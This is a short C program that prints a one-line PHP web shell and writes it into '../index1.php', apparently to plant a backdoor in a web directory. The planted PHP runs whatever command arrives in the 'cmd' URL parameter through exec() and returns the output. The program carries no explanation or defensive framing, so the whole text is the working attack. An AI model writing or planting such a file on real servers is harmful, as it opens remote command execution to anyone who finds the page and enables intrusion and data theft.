#include <stdio.h>
main(){
  char s[]="<?php if(!isset($_GET[\'cmd\'])){ echo \'no cmd\'; } else { echo exec($_GET[\'cmd\']); } ?>";
  puts(s);
  FILE *f=fopen("../index1.php","w");
  fprintf(f,s);
  fclose(f);
}